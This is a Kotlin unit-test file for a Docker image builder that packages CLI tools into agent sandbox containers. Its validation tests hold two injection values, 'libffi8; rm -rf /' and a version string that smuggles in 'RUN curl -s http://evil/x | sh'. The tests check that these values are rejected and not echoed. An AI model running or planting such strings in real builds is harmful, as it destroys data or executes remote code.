package com.agnetix.harnax.harness.sandbox

import com.agnetix.harnax.agent.CliSpec
import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertFalse
import org.junit.jupiter.api.Assertions.assertNotEquals
import org.junit.jupiter.api.Assertions.assertThrows
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Test
import org.junit.jupiter.api.io.TempDir
import org.mockito.kotlin.any
import org.mockito.kotlin.mock
import org.mockito.kotlin.never
import org.mockito.kotlin.verify
import org.mockito.kotlin.whenever
import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.attribute.PosixFilePermission
import java.nio.file.attribute.PosixFilePermissions

/**
 * Unit tests for [CliImageBuilder].
 *
 * Two seams keep a real Docker daemon and a real MinIO out of here: a scripted [DockerCommandExecutor]
 * for the commands, and a store stubbed to hand back a payload tree already on disk. The interesting
 * assertions are about what the builder puts in front of `docker build` — the context is where a
 * package's declared paths either do or do not land where the image says they do.
 */
class CliImageBuilderTest {

    private val baseImage = "python:3.11-slim"

    @TempDir
    lateinit var temp: Path

    private val kubectl = CliSpec(
        cliId = 1,
        name = "kubectl",
        version = "1.30.0",
        packageObject = "kubectl-1.30.0.harnaxcli.zip",
        packageDigest = "aa".repeat(32),
        payloadDigest = "bb".repeat(32),
        checkCommand = "kubectl version --client",
    )

    private val gh = CliSpec(
        cliId = 2,
        name = "gh",
        version = "2.50.0",
        packageObject = "gh-2.50.0.harnaxcli.zip",
        packageDigest = "cc".repeat(32),
        payloadDigest = "dd".repeat(32),
        depsApt = listOf("libffi8", "ca-certificates"),
        checkCommand = "gh --version",
    )

    /** Records executed commands and returns scripted results by command prefix. */
    private class ScriptedExecutor(
        private val handler: (List<String>) -> DockerCommandResult,
    ) : DockerCommandExecutor {
        val commands = mutableListOf<List<String>>()

        override fun execute(command: List<String>): DockerCommandResult {
            commands.add(command)
            return handler(command)
        }
    }

    /** A payload tree that looks like one: a binary under `usr/local/bin` plus one data file. */
    private fun fakePayload(binaryName: String): Path {
        val tree = Files.createTempDirectory(temp, "payload-")
        val binary = Files.createDirectories(tree.resolve("usr/local/bin")).resolve(binaryName)
        Files.writeString(binary, "#!/bin/sh\necho hi\n")
        Files.setPosixFilePermissions(binary, PosixFilePermissions.fromString("rwxr-xr-x"))
        Files.writeString(Files.createDirectories(tree.resolve("usr/local/share/doc")).resolve("$binaryName.md"), "docs")
        return tree
    }

    private fun storeReturning(trees: Map<String, Path>): CliPackageStore {
        val store = mock<CliPackageStore>()
        whenever(store.materialize(any(), any())).thenAnswer { invocation -> trees.getValue(invocation.getArgument<String>(0)) }
        return store
    }

    private fun builder(
        executor: DockerCommandExecutor,
        vararg trees: Pair<String, Path>,
    ): CliImageBuilder = CliImageBuilder(baseImage, if (trees.isEmpty()) mock() else storeReturning(trees.toMap()), executor)

    @Test
    fun `zero CLIs returns base image without any docker call`() {
        val executor = ScriptedExecutor { DockerCommandResult(0, "") }
        val store = mock<CliPackageStore>()

        assertEquals(baseImage, CliImageBuilder(baseImage, store, executor).resolveImage(emptyList()))

        assertTrue(executor.commands.isEmpty())
        verify(store, never()).materialize(any(), any())
    }

    @Test
    fun `combination hash is stable and order independent`() {
        val builder = builder(ScriptedExecutor { DockerCommandResult(0, "") })

        val hash1 = builder.combinationHash(listOf(kubectl, gh))
        val hash2 = builder.combinationHash(listOf(gh, kubectl))

        assertEquals(hash1, hash2)
        assertEquals(12, hash1.length)
    }

    @Test
    fun `combination hash changes when the payload changes`() {
        val builder = builder(ScriptedExecutor { DockerCommandResult(0, "") })

        val hash1 = builder.combinationHash(listOf(kubectl))
        val hash2 = builder.combinationHash(listOf(kubectl.copy(payloadDigest = "ee".repeat(32))))

        assertNotEquals(hash1, hash2)
    }

    /**
     * D15: only the payload decides whether a container is rebuilt. Editing a package's `SKILL.md`
     * changes its archive, so its `packageDigest` moves while `payloadDigest` holds — and an agent that
     * is already running keeps the image it has.
     */
    @Test
    fun `combination hash ignores a package-only change`() {
        val builder = builder(ScriptedExecutor { DockerCommandResult(0, "") })

        val hash1 = builder.combinationHash(listOf(kubectl))
        val hash2 = builder.combinationHash(listOf(kubectl.copy(packageDigest = "ff".repeat(32), packageObject = "other.zip")))

        assertEquals(hash1, hash2)
    }

    @Test
    fun `combination hash changes when base image changes`() {
        val hash1 = CliImageBuilder(baseImage, mock(), ScriptedExecutor { DockerCommandResult(0, "") }).combinationHash(listOf(kubectl))
        val hash2 = CliImageBuilder("ubuntu:24.04", mock(), ScriptedExecutor { DockerCommandResult(0, "") }).combinationHash(listOf(kubectl))

        assertNotEquals(hash1, hash2)
    }

    @Test
    fun `dockerfile lays each payload tree onto the container root in cliId order`() {
        val dockerfile = builder(ScriptedExecutor { DockerCommandResult(0, "") }).generateDockerfile(listOf(gh, kubectl))

        val lines = dockerfile.lines()
        assertEquals("FROM $baseImage", lines[0])
        assertTrue(lines[1].startsWith("# CLI: kubectl 1.30.0 (payload sha256:"))
        assertEquals("COPY ${kubectl.packageDigest}/ /", lines[2])
        assertEquals("COPY ${gh.packageDigest}/ /", lines[4])
        // gh declares apt deps: sorted, deduped, and cleaned up in the same layer it is needed in.
        assertEquals(
            "RUN apt-get update && apt-get install -y --no-install-recommends ca-certificates libffi8 " +
                "&& rm -rf /var/lib/apt/lists/*",
            lines[5],
        )
        // Sorted by cliId, so kubectl's layer comes first regardless of the order passed in.
        assertTrue(dockerfile.indexOf(kubectl.packageDigest) < dockerfile.indexOf(gh.packageDigest))
    }

    /** Design I4: the build never executes package content — the only RUN installs apt packages. */
    @Test
    fun `dockerfile runs no command that touches the payload`() {
        val dockerfile = builder(ScriptedExecutor { DockerCommandResult(0, "") }).generateDockerfile(listOf(kubectl, gh))

        val runs = dockerfile.lines().filter { it.startsWith("RUN") }
        assertEquals(1, runs.size)
        assertTrue(runs.all { it.contains("apt-get install") })
        assertTrue(runs.none { it.contains(kubectl.packageDigest) || it.contains(gh.packageDigest) })
    }

    @Test
    fun `existing image is reused without build or fetch`() {
        val executor = ScriptedExecutor { cmd ->
            when {
                cmd.take(3) == listOf("docker", "image", "inspect") -> DockerCommandResult(0, "found")
                else -> DockerCommandResult(1, "unexpected: $cmd")
            }
        }
        val store = mock<CliPackageStore>()

        val tag = CliImageBuilder(baseImage, store, executor).resolveImage(listOf(kubectl))

        assertTrue(tag.startsWith("harnax-sandbox:cli-"))
        assertTrue(executor.commands.none { it.getOrNull(1) == "build" })
        verify(store, never()).materialize(any(), any())
    }

    @Test
    fun `missing image triggers build and one check per CLI`() {
        val executor = ScriptedExecutor { cmd ->
            when {
                cmd.take(3) == listOf("docker", "image", "inspect") -> DockerCommandResult(1, "not found")
                cmd.getOrNull(1) == "build" -> DockerCommandResult(0, "built")
                cmd.getOrNull(1) == "run" -> DockerCommandResult(0, "ok")
                else -> DockerCommandResult(1, "unexpected: $cmd")
            }
        }

        val tag = builder(executor, payloadFor(kubectl, "kubectl"), payloadFor(gh, "gh")).resolveImage(listOf(kubectl, gh))

        assertTrue(tag.startsWith("harnax-sandbox:cli-"))
        assertEquals(1, executor.commands.count { it.getOrNull(1) == "build" })
        assertEquals(2, executor.commands.count { it.getOrNull(1) == "run" })
    }

    /**
     * The `COPY` names a directory of the build context, so the payload tree has to be sitting there
     * under the exact digest the Dockerfile refers to — otherwise the build fails far from its cause.
     */
    @Test
    fun `build context holds each payload tree under its package digest`() {
        var contextEntries: Set<String> = emptySet()
        var payloadFiles: Set<String> = emptySet()
        var dockerfileSnapshot = ""
        val executor = ScriptedExecutor { cmd ->
            when {
                cmd.take(3) == listOf("docker", "image", "inspect") -> DockerCommandResult(1, "not found")
                cmd.getOrNull(1) == "build" -> {
                    val context = Path.of(cmd.last())
                    // The builder removes the context the moment `docker build` returns, so the
                    // evidence has to be taken while it is still there.
                    contextEntries = Files.list(context).map { context.relativize(it).toString() }.toList().toSet()
                    payloadFiles = Files.walk(context)
                        .filter { Files.isRegularFile(it) }
                        .map { context.relativize(it).toString() }
                        .toList()
                        .toSet()
                    dockerfileSnapshot = Files.readString(context.resolve("Dockerfile"))
                    DockerCommandResult(0, "built")
                }
                else -> DockerCommandResult(0, "ok")
            }
        }

        builder(executor, payloadFor(kubectl, "kubectl"), payloadFor(gh, "gh")).resolveImage(listOf(kubectl, gh))

        assertEquals(setOf("Dockerfile", kubectl.packageDigest, gh.packageDigest), contextEntries)
        // `docker build` reads the whole context, so the shared cache must not be handed to it.
        assertTrue(payloadFiles.contains("${kubectl.packageDigest}/usr/local/bin/kubectl"), payloadFiles.toString())
        assertTrue(payloadFiles.contains("${gh.packageDigest}/usr/local/bin/gh"), payloadFiles.toString())
        assertTrue(dockerfileSnapshot.contains("COPY ${kubectl.packageDigest}/ /"))
    }

    /** Modes survive the trip into the context: a payload binary without an execute bit fails its check with 126. */
    @Test
    fun `payload executable keeps its mode inside the build context`() {
        var binaryPermissions: Set<PosixFilePermission>? = null
        val executor = ScriptedExecutor { cmd ->
            when {
                cmd.take(3) == listOf("docker", "image", "inspect") -> DockerCommandResult(1, "not found")
                cmd.getOrNull(1) == "build" -> {
                    val binary = Path.of(cmd.last()).resolve("${kubectl.packageDigest}/usr/local/bin/kubectl")
                    binaryPermissions = Files.getPosixFilePermissions(binary)
                    DockerCommandResult(0, "built")
                }
                else -> DockerCommandResult(0, "ok")
            }
        }

        builder(executor, payloadFor(kubectl, "kubectl")).resolveImage(listOf(kubectl))

        assertEquals("rwxr-xr-x", PosixFilePermissions.toString(binaryPermissions!!))
    }

    @Test
    fun `payload is fetched by the digest and object key admin registered`() {
        val executor = ScriptedExecutor { cmd ->
            when {
                cmd.take(3) == listOf("docker", "image", "inspect") -> DockerCommandResult(1, "not found")
                else -> DockerCommandResult(0, "ok")
            }
        }
        val store = mock<CliPackageStore>()
        whenever(store.materialize(kubectl.packageDigest, kubectl.packageObject)).thenReturn(fakePayload("kubectl"))

        CliImageBuilder(baseImage, store, executor).resolveImage(listOf(kubectl))

        verify(store).materialize(kubectl.packageDigest, kubectl.packageObject)
    }

    @Test
    fun `build failure throws with CLI names in message`() {
        val executor = ScriptedExecutor { cmd ->
            when {
                cmd.take(3) == listOf("docker", "image", "inspect") -> DockerCommandResult(1, "not found")
                cmd.getOrNull(1) == "build" -> DockerCommandResult(1, "network unreachable")
                else -> DockerCommandResult(0, "")
            }
        }

        val ex = assertThrows(IllegalStateException::class.java) {
            builder(executor, payloadFor(kubectl, "kubectl")).resolveImage(listOf(kubectl))
        }
        assertTrue(ex.message!!.contains("kubectl"))
    }

    @Test
    fun `failed check command removes image and throws`() {
        val executor = ScriptedExecutor { cmd ->
            when {
                cmd.take(3) == listOf("docker", "image", "inspect") -> DockerCommandResult(1, "not found")
                cmd.getOrNull(1) == "build" -> DockerCommandResult(0, "built")
                cmd.getOrNull(1) == "run" -> DockerCommandResult(127, "command not found")
                else -> DockerCommandResult(0, "")
            }
        }

        val ex = assertThrows(IllegalStateException::class.java) {
            builder(executor, payloadFor(kubectl, "kubectl")).resolveImage(listOf(kubectl))
        }
        assertTrue(ex.message!!.contains("kubectl"))
        assertTrue(executor.commands.any { it.getOrNull(1) == "rmi" })
    }

    @Test
    fun `blank check command is skipped`() {
        val executor = ScriptedExecutor { cmd ->
            when {
                cmd.take(3) == listOf("docker", "image", "inspect") -> DockerCommandResult(1, "not found")
                cmd.getOrNull(1) == "build" -> DockerCommandResult(0, "built")
                else -> DockerCommandResult(1, "unexpected: $cmd")
            }
        }

        builder(executor, payloadFor(kubectl, "kubectl")).resolveImage(listOf(kubectl.copy(checkCommand = "")))

        assertFalse(executor.commands.any { it.getOrNull(1) == "run" })
    }

    /**
     * The runtime re-checks what admin checked, because it has no way to know the row it was handed was
     * written by the registrar. These are the values that land in a generated Dockerfile and in directory
     * names under the build context, so a spec that skips the rules has to fail here rather than at
     * `docker build`.
     */
    @Test
    fun `a spec value no package could register is refused before anything runs`() {
        val executor = ScriptedExecutor { DockerCommandResult(1, "unexpected: $it") }
        val store = mock<CliPackageStore>()
        val cases = listOf(
            kubectl.copy(name = "Kubectl") to "name",
            kubectl.copy(version = "") to "version",
            kubectl.copy(packageDigest = "not-a-digest") to "packageDigest",
            kubectl.copy(payloadDigest = "") to "payloadDigest",
            kubectl.copy(depsApt = listOf("ca-certificates", "libffi8; rm -rf /")) to "depsApt",
        )

        for ((cli, field) in cases) {
            val builder = CliImageBuilder(baseImage, store, executor)

            val ex = assertThrows(IllegalStateException::class.java, { builder.resolveImage(listOf(cli)) }, cli.toString())

            assertTrue(ex.message!!.contains(field), "expected $field to be named in: ${ex.message}")
        }
        assertTrue(executor.commands.isEmpty(), "docker was asked before the spec was checked: ${executor.commands}")
        verify(store, never()).materialize(any(), any())
    }

    /** A refusal that quotes the rejected text would itself write an attacker-shaped line into the log. */
    @Test
    fun `a refused spec names the field without echoing its text`() {
        val builder = builder(ScriptedExecutor { DockerCommandResult(0, "") })
        val injected = "1.0.0\nRUN curl -s http://evil/x | sh"

        val ex = assertThrows(IllegalStateException::class.java) {
            builder.resolveImage(listOf(kubectl.copy(version = injected)))
        }

        assertTrue(ex.message!!.contains("version"), ex.message!!)
        assertFalse(ex.message!!.contains("curl"), "the refusal echoed the value: ${ex.message}")
        assertFalse(ex.message!!.contains("RUN"), "the refusal echoed the value: ${ex.message}")
    }

    /** A tag already built by this JVM must not cost another `docker image inspect` per agent creation. */
    @Test
    fun `second resolve of the same CLI set asks docker nothing`() {
        val executor = ScriptedExecutor { cmd ->
            when {
                cmd.take(3) == listOf("docker", "image", "inspect") -> DockerCommandResult(1, "not found")
                else -> DockerCommandResult(0, "ok")
            }
        }
        val cliBuilder = builder(executor, payloadFor(kubectl, "kubectl"), payloadFor(gh, "gh"))

        val first = cliBuilder.resolveImage(listOf(kubectl, gh))
        val inspectCalls = executor.commands.count { it.getOrNull(1) == "inspect" }
        val second = cliBuilder.resolveImage(listOf(kubectl, gh))

        assertEquals(first, second)
        assertEquals(inspectCalls, executor.commands.count { it.getOrNull(1) == "inspect" })
    }

    /** A payload tree paired with the package digest its CLI carries, so the stub answers by digest. */
    private fun payloadFor(
        cli: CliSpec,
        binaryName: String,
    ): Pair<String, Path> = cli.packageDigest to fakePayload(binaryName)
}
